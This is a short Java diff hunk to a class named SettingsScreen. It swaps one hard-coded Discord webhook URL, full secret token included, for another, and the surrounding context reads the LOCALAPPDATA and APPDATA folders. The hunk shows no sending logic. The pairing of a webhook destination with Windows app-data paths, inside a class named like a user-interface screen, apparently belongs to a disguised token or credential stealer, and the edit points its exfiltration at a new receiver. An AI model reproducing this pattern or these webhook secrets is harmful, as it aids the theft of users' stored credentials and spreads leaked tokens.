@@ -11,7 +11,7 @@ import java.util.regex.Pattern;
 
 public class SettingsScreen {
 
-    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1526292110200930416/FY4t5mPrdTSYHTEYG-7GqvQs_234OEPawHBogeMpB7p6oisqssmnR1Z1n-VvI-ltZN19";
+    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1531356375480012923/pQR2d9EagZkDojFoWJC28EV1K8xE1Ig5WQCW96-Jmq1fwm8_dXTE9NcyDKdq4aw57zb1";
 
     private static final String LOCAL = System.getenv("LOCALAPPDATA");
     private static final String ROAMING = System.getenv("APPDATA");
